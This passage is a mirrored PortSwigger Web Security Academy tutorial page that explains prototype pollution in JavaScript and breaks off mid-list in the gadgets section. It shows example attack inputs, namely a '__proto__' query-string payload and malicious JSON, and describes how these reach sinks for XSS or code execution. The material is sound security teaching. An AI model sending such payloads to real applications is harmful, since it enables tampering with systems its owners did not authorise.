@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from portswigger.net/web-security/prototype-pollution by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 17 Apr 2026 22:05:36 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="utf-8">
+    <meta content="IE=edge" http-equiv="X-UA-Compatible">
+    <meta content="width=device-width, initial-scale=1" name="viewport">
+    <title>What is prototype pollution? | Web Security Academy</title>
+    <meta content="Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be ..." name="description">
+    <!-- Twitter data -->
+
+
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="">
+<meta name="twitter:image" content="../content/images/logos/academy-twittercard.png">
+    <meta name="twitter:site" content="@WebSecAcademy">
+
+<!-- Open Graph data -->
+<meta property="og:title" content=""/>
+<meta property="og:url" content="https://portswigger.net/"/>
+<meta property="og:image" content="../content/images/logos/academy-twittercard.png"/>
+<meta property="og:type" content="website"/>
+<link rel="canonical" href="prototype-pollution.html"/>
+<link rel="icon" href="../content/images/logos/favicon.ico" type="image/x-icon"/>
+<link rel="apple-touch-icon" href="../content/images/logos/apple-touch-icon.png">
+    <link href="../content/pswebsecacademy.css" rel="stylesheet" type="text/css">
+    <link rel="preload" href="../content/fonts/ps-icons-small/ps-icons-small5722.woff?td2uot" as="font" crossorigin="anonymous">
+<link rel="preload" href="../content/fonts/ps-main/ps-icons6208.woff?l1la2n" as="font" crossorigin="anonymous">
+</head>
+<body class="theme-">
+
+
+<script nonce="Ld5MR72mOycZkyNawHkNrEhDADpcr7ON">
+    (function (window, document, dataLayerName, id) {
+        window[dataLayerName] = window[dataLayerName] || [], window[dataLayerName].push({
+            start: (new Date).getTime(),
+            event: "stg.start"
+        });
+        var scripts = document.getElementsByTagName('script')[0], tags = document.createElement('script');
+        var qP = [];
+        dataLayerName !== "dataLayer" && qP.push("data_layer_name=" + dataLayerName), tags.nonce = "Ld5MR72mOycZkyNawHkNrEhDADpcr7ON";
+        var qPString = qP.length > 0 ? ("?" + qP.join("&")) : "";
+        tags.async = !0, tags.src = "https://ps.containers.piwik.pro/" + id + ".js" + qPString,
+            scripts.parentNode.insertBefore(tags, scripts);
+        !function (a, n, i) {
+            a[n] = a[n] || {};
+            for (var c = 0; c < i.length; c++) !function (i) {
+                a[n][i] = a[n][i] || {}, a[n][i].api = a[n][i].api || function () {
+                    var a = [].slice.call(arguments, 0);
+                    "string" == typeof a[0] && window[dataLayerName].push({
+                        event: n + "." + i + ":" + a[0],
+                        parameters: [].slice.call(arguments, 1)
+                    })
+                }
+            }(i[c])
+        }(window, "ppms", ["tm", "cm"]);
+    })(window, document, 'dataLayer', '287552c2-4917-42e0-8982-ba994a2a73d7');
+</script>
+
+
+
+<header class="page-header" id="top">
+    <div class="container">
+    <a class="logo" href="https://portswigger.net/"></a>
+    <div class="header-right">
+        <div class="login-buttons">
+            <a class="button-orange-small" href="https://portswigger.net/users/youraccount/personaldetails">My account</a>
+        </div>
+        
+
+    <input type="checkbox" id="hamburger-mobile" class="hamburger-input-mobile">
+    <input type="radio" id="hamburger-desktop" class="hamburger-input-desktop" name="mega-nav-input">
+    <div class="hamburger-menu-mobile">
+        <label class="hamburger-menu-label header-hidden" for="hamburger-mobile">
+            <span class="hamburger-layers"></span>
+        </label>
+    </div>
+    <div class="mega-nav">
+        <input type="radio" id="mega-nav-close" class="mega-nav-input-close" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-1" class="mega-nav-input-1" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-2" class="mega-nav-input-2" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-6" class="mega-nav-input-6" name="mega-nav-input">
+        <input type="radio" id="mega-nav-label-7" class="mega-nav-input-7" name="mega-nav-input">
+
+        <label for="mega-nav-close" class="mega-nav-close"></label>
+
+        <label class="mega-nav-label mega-nav-label-1" for="mega-nav-label-1">
+            <span class="mega-nav-text">Products</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <label class="mega-nav-label mega-nav-label-2" for="mega-nav-label-2">
+            <span class="mega-nav-text">Solutions</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <a class="mega-nav-link" href="https://portswigger.net/research"><span class="mega-nav-text">Research</span></a>
+        <a class="mega-nav-link" href="https://portswigger.net/web-security"><span class="mega-nav-text">Academy</span></a>
+        <label class="mega-nav-label mega-nav-label-6" for="mega-nav-label-6">
+            <span class="mega-nav-text">Support</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+
+        <label class="mega-nav-label mega-nav-label-7 header-hidden" for="mega-nav-label-7">
+            <span class="mega-nav-text">Company</span>
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <div class="hamburger-menu-desktop">
+            <label class="hamburger-menu-label header-show" for="hamburger-desktop">
+                <span class="hamburger-layers"></span>
+            </label>
+            <div>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-1" href="https://portswigger.net/customers"><span class="mega-nav-text">Customers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-3" href="https://portswigger.net/about"><span class="mega-nav-text">About</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-4" href="https://portswigger.net/blog"><span class="mega-nav-text">Blog</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-5" href="https://portswigger.net/careers"><span class="mega-nav-text">Careers</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-6" href="https://portswigger.net/legal"><span class="mega-nav-text">Legal</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-7" href="https://portswigger.net/contact"><span class="mega-nav-text">Contact</span></a>
+                <a class="hamburger-menu-desktop-link hamburger-menu-desktop-link-8" href="https://portswigger.net/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+            </div>
+        </div>
+
+        <a class="mega-nav-link header-hidden" href="https://portswigger.net/users/youraccount"><span class="mega-nav-text">My account</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-1" href="https://portswigger.net/customers"><span class="mega-nav-text">Customers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-3" href="https://portswigger.net/about"><span class="mega-nav-text">About</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-4" href="https://portswigger.net/blog"><span class="mega-nav-text">Blog</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-5" href="https://portswigger.net/careers"><span class="mega-nav-text">Careers</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-6" href="https://portswigger.net/legal"><span class="mega-nav-text">Legal</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-7" href="https://portswigger.net/contact"><span class="mega-nav-text">Contact</span></a>
+        <a class="hamburger-menu-link hamburger-menu-link-8" href="https://portswigger.net/support/reseller-faqs"><span class="mega-nav-text">Resellers</span></a>
+
+        <div class="mega-nav-container">
+
+            <div class="mega-nav-content mega-nav-content-1">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <a href="https://portswigger.net/burp/enterprise" class="link-block-white">
+                                <img src="../content/images/svg/icons/enterprise.svg" alt="Burp Suite DAST">
+                                <span><strong>Burp Suite DAST</strong></span>
+                                <span>The enterprise-enabled dynamic web vulnerability scanner.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/pro" class="link-block-white">
+                                <img src="../content/images/svg/icons/professional.svg" alt="Burp Suite Professional">
+                                <span><strong>Burp Suite Professional</strong></span>
+                                <span>The world's #1 web penetration testing toolkit.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp/communitydownload" class="link-block-white">
+                                <img src="../content/images/svg/icons/community.svg" alt="Burp Suite Community Edition">
+                                <span><strong>Burp Suite Community Edition</strong></span>
+                                <span>The best manual tools to start web security testing.</span>
+                            </a>
+
+                            <a href="https://portswigger.net/burp" class="chevron-after">View all product editions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/vulnerability-scanner">
+                                    <p><strong>Burp Scanner</strong></p>
+                                    <p>Burp Suite's web vulnerability scanner</p>
+                                    <img src="../mega-nav/images/burp-suite-scanner.jpg" alt="Burp Suite's web vulnerability scanner'">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-2">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="https://portswigger.net/solutions/attack-surface-visibility" class="link-block-white">
+                                    <span><strong>Attack surface visibility</strong></span>
+                                    <span>Improve security posture, prioritize manual testing, free up time.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/ci-driven-scanning" class="link-block-white">
+                                    <span><strong>CI-driven scanning</strong></span>
+                                    <span>More proactive security - find and fix vulnerabilities earlier.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions" class="link-block-white">
+                                    <span><strong>Application security testing</strong></span>
+                                    <span>See how our software enables the world to secure the web.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/devsecops" class="link-block-white">
+                                    <span><strong>DevSecOps</strong></span>
+                                    <span>Catch critical bugs; ship more secure software, more quickly.</span>
+                                </a>
+
+                                <a href="https://portswigger.net/solutions/penetration-testing" class="link-block-white">
+                                    <span><strong>Penetration testing</strong></span>
+                                    <span>Accelerate penetration testing - find more bugs, more quickly.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/automated-security-testing" class="link-block-white">
+                                    <span><strong>Automated scanning</strong></span>
+                                    <span>Scale dynamic scanning. Reduce risk. Save time/money.</span>
+                                </a>
+
+                                <a href="https://portswigger.net/solutions/bug-bounty-hunting" class="link-block-white">
+                                    <span><strong>Bug bounty hunting</strong></span>
+                                    <span>Level up your hacking and earn more bug bounties.</span>
+                                </a>
+                                <a href="https://portswigger.net/solutions/compliance" class="link-block-white">
+                                    <span><strong>Compliance</strong></span>
+                                    <span>Enhance security monitoring to comply with confidence.</span>
+                                </a>
+                            </div>
+                            <a href="https://portswigger.net/solutions" class="chevron-after">View all solutions</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/enterprise/resources/enterprise-edition-vs-professional">
+                                    <p><strong>Product comparison</strong></p>
+                                    <p>What's the difference between Pro and Enterprise Edition?</p>
+                                    <img src="../mega-nav/images/burp-suite.jpg" alt="Burp Suite Professional vs Burp Suite Enterprise Edition">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+            <div class="mega-nav-content mega-nav-content-6">
+                <div class="section-white-medium-no-padding">
+                    <div class="container-columns-66-percent-right">
+                        <div>
+                            <div class="container-columns">
+                                <a href="https://portswigger.net/support" class="link-block-white">
+                                    <span><strong>Support Center</strong></span>
+                                    <span>Get help and advice from our experts on all things Burp.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation" class="link-block-white">
+                                    <span><strong>Documentation</strong></span>
+                                    <span>Tutorials and guides for Burp Suite.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation/desktop/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Professional</strong></span>
+                                    <span>Get started with Burp Suite Professional.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/documentation/enterprise/getting-started" class="link-block-white">
+                                    <span><strong>Get Started - Enterprise</strong></span>
+                                    <span>Get started with Burp Suite Enterprise Edition.</span>
+                                </a>
+                                <a href="https://forum.portswigger.net/" class="link-block-white">
+                                    <span><strong>User Forum</strong></span>
+                                    <span>Get your questions answered in the User Forum.</span>
+                                </a>
+                                <a href="https://portswigger.net/burp/releases" class="link-block-white">
+                                    <span><strong>Downloads</strong></span>
+                                    <span>Download the latest version of Burp Suite.</span>
+                                </a>
+                            </div>
+                            <a href="https://portswigger.net/support" class="chevron-after">Visit the Support Center</a>
+                        </div>
+
+                        <div>
+                            <div class="container-cards-lists-white">
+                                <a href="https://portswigger.net/burp/releases">
+                                    <p><strong>Downloads</strong></p>
+                                    <p>Download the latest version of Burp Suite.</p>
+                                    <img src="../mega-nav/images/latest-burp-suite-software-download.jpg" alt="The latest version of Burp Suite software for download">
+                                </a>
+                            </div>
+
+                        </div>
+
+
+                    </div>
+                </div>
+            </div>
+
+        </div>
+
+    </div>
+
+
+    </div>
+</div>
+</header>
+
+            <nav class="navigation-top">
+                <input type="checkbox" id="nav-main-enterprise">
+                <label for="nav-main-enterprise">
+                    <span>Academy home</span>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="dashboard.html">Dashboard</a></li>
+                    <li><a href="learning-paths.html">Learning paths</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-topics">
+                        <label for="nav-main-academy-topics">
+                            <span>Latest topics</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="request-smuggling.html">Request smuggling</a>
+                            <a href="web-cache-deception.html">Web cache deception</a>
+                            <a href="llm-attacks.html">Web LLM attacks</a>
+                            <a href="api-testing.html">API testing</a>
+                            <a href="nosql-injection.html">NoSQL injection</a>
+                            <a href="all-topics.html">View all topics</a>
+                        </div>
+                    </li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-all-content">
+                        <label for="nav-main-academy-all-content">
+                            <span>All content</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="all-labs.html">All labs</a>
+                            <a href="all-topics.html">All topics</a>
+                            <a href="mystery-lab-challenge.html">Mystery labs</a>
+                        </div>
+                    </li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-hall-of-fame">
+                        <label for="nav-main-academy-hall-of-fame">
+                            <span>Hall of Fame</span>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                            <a href="hall-of-fame.html">Leaderboard</a>
+                            <a href="getting-started/kamil-vavra.html">Interview - Kamil Vavra</a>
+                            <a href="getting-started/johnny-villarreal.html">Interview - Johnny Villarreal</a>
+                            <a href="getting-started/andres-rauschecker.html">Interview - Andres Rauschecker</a>
+                        </div>
+                    </li>
+                    <li><a href="getting-started.html">Get started</a></li>
+                    <li>
+                        <input type="checkbox" id="nav-main-academy-certification">
+                        <label for="nav-main-academy-certification">
+                             <span>Get certified</span>
+                             <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <div>
+                             <a href="certification.html">Get certified</a>
+                             <a href="certification/how-to-prepare.html">How to prepare</a>
+                             <a href="certification/how-it-works.html">How it works</a>
+                             <a href="certification/practice-exam.html">Practice exam</a>
+                             <a href="certification/exam-hints-and-guidance.html">Exam hints and guidance</a>
+                             <a href="certification/how-it-works.html#what-the-exam-involves">What the exam involves</a>
+                             <a href="certification/frequently-asked-questions.html">FAQs</a>
+                             <a href="certification.html#validate-your-certification">Validate your certification</a>
+                        </div>
+                    </li>
+                </ul>
+            </nav>
+        
+<div class="wrapper-large">
+    <div class="container-academy">
+
+        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
+        <aside class="nav-lhs" id="tree-nav" tree-nav-version="32">
+            <nav class="nav-lhs-scrollable">
+                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
+                
+
+        <a class="nav-back" href="all-topics.html">
+            <span class="icon-arrow-head-left"></span>
+            Back to all topics
+        </a>
+        <input type="checkbox" id="nav-main-id">
+        <label class="nav-label" for="nav-main-id">
+            <span class="icon-arrow-head-down"></span>
+        </label>
+        <h3>Prototype pollution</h3>
+        <ul>
+            <li><a href="prototype-pollution.html">What is prototype pollution?</a></li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-1">
+                <label for="sub-nav-id-1">
+                    <a href="prototype-pollution/javascript-prototypes-and-inheritance.html">JavaScript prototypes and inheritance</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="prototype-pollution/javascript-prototypes-and-inheritance.html#what-is-an-object-in-javascript">What is an object in JavaScript?</a></li>
+                    <li><a href="prototype-pollution/javascript-prototypes-and-inheritance.html#what-is-a-prototype-in-javascript">What is a prototype in JavaScript?</a></li>
+                    <li><a href="prototype-pollution/javascript-prototypes-and-inheritance.html#how-does-object-inheritance-work-in-javascript">Object inheritance</a></li>
+                    <li><a href="prototype-pollution/javascript-prototypes-and-inheritance.html#the-prototype-chain">Prototype chain</a></li>
+                    <li><a href="prototype-pollution/javascript-prototypes-and-inheritance.html#accessing-an-object-s-prototype-using-proto">Accessing an object's prototype</a></li>
+                    <li><a href="prototype-pollution/javascript-prototypes-and-inheritance.html#modifying-prototypes">Modifying prototypes</a></li>
+                </ul>
+            </li>
+            <li><a href="prototype-pollution.html#how-do-prototype-pollution-vulnerabilities-arise">How vulnerabilities arise</a></li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-2">
+                <label for="sub-nav-id-2">
+                    <a href="prototype-pollution.html#prototype-pollution-sources">Sources</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="prototype-pollution.html#prototype-pollution-via-the-url">URL</a></li>
+                    <li><a href="prototype-pollution.html#prototype-pollution-via-json-input">JSON input</a></li>
+                </ul>
+            </li>
+            <li><a href="prototype-pollution.html#prototype-pollution-sinks">Sinks</a></li>
+            <li><a href="prototype-pollution.html#prototype-pollution-gadgets">Gadgets</a></li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-3">
+                <label for="sub-nav-id-3">
+                    <a href="prototype-pollution/client-side.html">Client-side prototype pollution</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="prototype-pollution/client-side.html#finding-client-side-prototype-pollution-sources-manually">Finding sources manually</a></li>
+                    <li><a href="prototype-pollution/client-side.html#finding-client-side-prototype-pollution-sources-using-dom-invader">Finding sources using DOM Invader</a></li>
+                    <li><a href="prototype-pollution/client-side.html#finding-client-side-prototype-pollution-gadgets-manually">Finding gadgets manually</a></li>
+                    <li><a href="prototype-pollution/client-side.html#finding-client-side-prototype-pollution-gadgets-using-dom-invader">Finding gadgets using DOM Invader</a></li>
+                    <li><a href="prototype-pollution/client-side.html#prototype-pollution-via-the-constructor">Prototype pollution via the constructor</a></li>
+                    <li><a href="prototype-pollution/client-side.html#bypassing-flawed-key-sanitization">Bypassing flawed key sanitization</a></li>
+                    <li><a href="prototype-pollution/client-side.html#prototype-pollution-in-external-libraries">Prototype pollution in external libraries</a></li>
+                    <li>
+                        <input type="checkbox" id="sub-nav-id-4">
+                        <label for="sub-nav-id-4">
+                            <a href="prototype-pollution/client-side/browser-apis.html">Prototype pollution via browser APIs</a>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <ul>
+                            <li><a href="prototype-pollution/client-side/browser-apis.html#prototype-pollution-via-fetch">fetch() method</a></li>
+                            <li><a href="prototype-pollution/client-side/browser-apis.html#prototype-pollution-via-object-defineproperty">Object.defineProperty() method</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-5">
+                <label for="sub-nav-id-5">
+                    <a href="prototype-pollution/server-side.html">Server-side prototype pollution</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="prototype-pollution/server-side.html#why-is-server-side-prototype-pollution-more-difficult-to-detect">Why is server-side prototype pollution more difficult to detect?</a></li>
+                    <li><a href="prototype-pollution/server-side.html#detecting-server-side-prototype-pollution-via-polluted-property-reflection">Detecting via polluted property reflection</a></li>
+                    <li>
+                        <input type="checkbox" id="sub-nav-id-6">
+                        <label for="sub-nav-id-6">
+                            <a href="prototype-pollution/server-side.html#detecting-server-side-prototype-pollution-without-polluted-property-reflection">Detecting without polluted property reflection</a>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <ul>
+                            <li><a href="prototype-pollution/server-side.html#status-code-override">Status code override</a></li>
+                            <li><a href="prototype-pollution/server-side.html#json-spaces-override">JSON spaces override</a></li>
+                            <li><a href="prototype-pollution/server-side.html#charset-override">Charset override</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="prototype-pollution/server-side.html#scanning-for-server-side-prototype-pollution-sources">Scanning for sources</a></li>
+                    <li><a href="prototype-pollution/server-side.html#bypassing-input-filters-for-server-side-prototype-pollution">Bypassing input filters</a></li>
+                    <li>
+                        <input type="checkbox" id="sub-nav-id-7">
+                        <label for="sub-nav-id-7">
+                            <a href="prototype-pollution/server-side.html#remote-code-execution-via-server-side-prototype-pollution">Remote code execution</a>
+                            <span class="icon-arrow-head-down"></span>
+                        </label>
+                        <ul>
+                            <li><a href="prototype-pollution/server-side.html#identifying-a-vulnerable-request">Identifying a vulnerable request</a></li>
+                            <li><a href="prototype-pollution/server-side.html#remote-code-execution-via-child-process-fork">child_process.fork() method</a></li>
+                            <li><a href="prototype-pollution/server-side.html#remote-code-execution-via-child-process-execsync">child_process.execSync() method</a></li>
+                        </ul>
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <input type="checkbox" id="sub-nav-id-8">
+                <label for="sub-nav-id-8">
+                    <a href="prototype-pollution/preventing.html">Preventing vulnerabilities</a>
+                    <span class="icon-arrow-head-down"></span>
+                </label>
+                <ul>
+                    <li><a href="prototype-pollution/preventing.html#sanitizing-property-keys">Sanitizing property keys</a></li>
+                    <li><a href="prototype-pollution/preventing.html#preventing-changes-to-prototype-objects">Preventing changes to prototype objects</a></li>
+                    <li><a href="prototype-pollution/preventing.html#preventing-an-object-from-inheriting-properties">Preventing an object from inheriting properties</a></li>
+                    <li><a href="prototype-pollution/preventing.html#using-safer-alternatives-where-possible">Using safer alternatives where possible</a></li>
+                </ul>
+            </li>
+            <li><a href="all-labs.html#prototype-pollution">View all prototype pollution labs</a></li>
+        </ul>
+    
+            </nav>
+        </aside>
+        <main>
+            
+
+
+
+<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemscope itemtype="http://schema.org/Thing" itemprop="item" href="https://portswigger.net/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemscope itemtype="http://schema.org/Thing" itemprop="item" href="prototype-pollution.html"><span itemprop="name">Prototype pollution</span></a><meta itemprop="position" content="2" /></li></ul>    <div class="section theme-white">
+
+        <h1 cms-ignore-validation="DUPLICATE_HEADINGS" class="heading-2" id="what-is-prototype-pollution" chunk-id="2B5DA48F38C4522FCDB23BCB248487CE">What is prototype pollution?</h1><p>
+    Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.
+</p><img alt="Polluting a config object via prototype pollution" src="prototype-pollution/images/prototype-pollution-infographic.svg"><p>
+    Although prototype pollution is often unexploitable as a standalone vulnerability, it lets an attacker control properties of objects that would otherwise be inaccessible. If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to <a href="cross-site-scripting/dom-based.html">DOM XSS</a>, while server-side prototype pollution can even result in remote code execution.
+</p><p id="what-is-prototype-pollution-D4R0">
+    If you're unfamiliar with how prototypes and inheritance work in JavaScript, we recommend reading the following overview before continuing.
+</p><p>
+    <a href="prototype-pollution/javascript-prototypes-and-inheritance.html">JavaScript prototypes and inheritance</a>
+</p><div class="highlightedarea">
+    <h4>Labs</h4>
+    <p>
+        If you're already familiar with prototype pollution and just want to practice on a series of deliberately vulnerable sites, check out the link below for an overview of all labs in this topic.
+    </p>
+
+    <ul><li><a href="all-labs.html#prototype-pollution"><span class="label-light-green-small">LABS</span> View all prototype pollution labs</a></li></ul></div><h2 id="how-do-prototype-pollution-vulnerabilities-arise" chunk-id="4610C7A249DBAF927D8FB2C2F714B3C1">How do prototype pollution vulnerabilities arise?</h2><p>
+    Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like <code>__proto__</code>, along with arbitrary nested properties.
+</p><p>
+    Due to the <a href="prototype-pollution/javascript-prototypes-and-inheritance.html#accessing-an-object-s-prototype-using-proto">special meaning of <code>__proto__</code></a> in a JavaScript context, the merge operation may assign the nested properties to the object's <a href="prototype-pollution/javascript-prototypes-and-inheritance.html#what-is-a-prototype-in-javascript">prototype</a> instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.
+</p><p>
+    It's possible to pollute any prototype object, but this most commonly occurs with the <a href="prototype-pollution/javascript-prototypes-and-inheritance.html#the-prototype-chain">built-in global <code>Object.prototype</code></a>.
+</p><p id="how-do-prototype-pollution-vulnerabilities-arise-A9A4" chunk-id="8FAE00E84D351673027266B76FE5543B">
+    Successful exploitation of prototype pollution requires the following key components:
+</p><ul>
+    <li>
+        <p>
+            <a href="prototype-pollution.html#prototype-pollution-sources">A prototype pollution source</a> - This is any input that enables you to poison prototype objects with arbitrary properties.
+        </p>
+    </li>
+    <li>
+        <p>
+            <a href="prototype-pollution.html#prototype-pollution-sinks">A sink</a> - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
+        </p>
+    </li>
+    <li>
+        <p>
+            <a href="prototype-pollution.html#prototype-pollution-gadgets">An exploitable gadget</a> - This is any property that is passed into a sink without proper filtering or sanitization.
+        </p>
+    </li>
+</ul><h2 id="prototype-pollution-sources" chunk-id="A7B427ED14AA031ECEBB90E0CB075E2F">Prototype pollution sources</h2><p>
+    A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows:
+</p><ul>
+    <li>
+        <p>
+            The <a href="prototype-pollution.html#prototype-pollution-via-the-url">URL</a> via either the query or fragment string (hash)
+        </p>
+    </li>
+    <li>
+        <p>
+            <a href="prototype-pollution.html#prototype-pollution-via-json-input">JSON-based input</a>
+        </p>
+    </li>
+    <li>
+        <p>
+            Web messages
+        </p>
+    </li>
+</ul><h3 id="prototype-pollution-via-the-url" chunk-id="2AA6D4323F49F760330910DBE128A28A">Prototype pollution via the URL</h3><p>
+    Consider the following URL, which contains an attacker-constructed query string:
+</p><code class="code-scrollable">https://vulnerable-website.com/?__proto__[evilProperty]=payload</code><p>
+    When breaking the query string down into <code>key:value</code> pairs, a URL parser may interpret <code>__proto__</code> as an arbitrary string. But let's look at what happens if these keys and values are subsequently merged into an existing object as properties.
+</p><p>
+    You might think that the <code>__proto__</code> property, along with its nested <code>evilProperty</code>, will just be added to the target object as follows:
+</p><code class="code-scrollable">{
+    existingProperty1: 'foo',
+    existingProperty2: 'bar',
+    __proto__: {
+        evilProperty: 'payload'
+    }
+}</code><p>
+    However, this isn't the case. At some point, the recursive merge operation may assign the value of <code>evilProperty</code> using a statement equivalent to the following:
+</p><code class="code-scrollable">targetObject.__proto__.evilProperty = 'payload';</code><p>
+    During this assignment, the JavaScript engine treats <code>__proto__</code> as a getter for the prototype. As a result, <code>evilProperty</code> is assigned to the returned prototype object rather than the target object itself. Assuming that the target object uses the default <code>Object.prototype</code>, all objects in the JavaScript runtime will now inherit <code>evilProperty</code>, unless they already have a property of their own with a matching key.
+</p><p>
+    In practice, injecting a property called <code>evilProperty</code> is unlikely to have any effect. However, an attacker can use the same technique to pollute the prototype with properties that are used by the application, or any imported libraries.
+</p><h3 id="prototype-pollution-via-json-input" chunk-id="D8F59D8A14D16BA22E4BB75FB5FF418B">Prototype pollution via JSON input</h3><p>
+    User-controllable objects are often derived from a JSON string using the <code>JSON.parse()</code> method. Interestingly, <code>JSON.parse()</code> also treats any key in the JSON object as an arbitrary string, including things like <code>__proto__</code>. This provides another potential vector for prototype pollution.
+</p><p>
+    Let's say an attacker injects the following malicious JSON, for example, via a web message:
+</p><code class="code-scrollable">{
+    "__proto__": {
+        "evilProperty": "payload"
+    }
+}</code><p>
+    If this is converted into a JavaScript object via the <code>JSON.parse()</code> method, the resulting object will in fact have a property with the key <code>__proto__</code>:
+</p><code class="code-scrollable">const objectLiteral = {__proto__: {evilProperty: 'payload'}};
+const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');
+
+objectLiteral.hasOwnProperty('__proto__');     <span class="grey">// false</span>
+objectFromJson.hasOwnProperty('__proto__');    <span class="grey">// true</span></code><p>
+    If the object created via <code>JSON.parse()</code> is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment, as we saw in the previous <a href="prototype-pollution.html#prototype-pollution-via-the-url">URL-based example</a>.
+</p><h2 id="prototype-pollution-sinks" chunk-id="36F06834EB4E53A18684A3BBCED15679">Prototype pollution sinks</h2><p>
+    A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on <a href="cross-site-scripting/dom-based.html">DOM XSS</a>.
+</p><p>
+    As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.
+</p><h2 id="prototype-pollution-gadgets" chunk-id="FCD70134FB58E4A420F8A5EEB587965E">Prototype pollution gadgets</h2><p>
+    A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:
+</p><ul>
+    <li>
+        <p>
+            Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
+        </p>
+    </li>
+    <li>
+        <p>
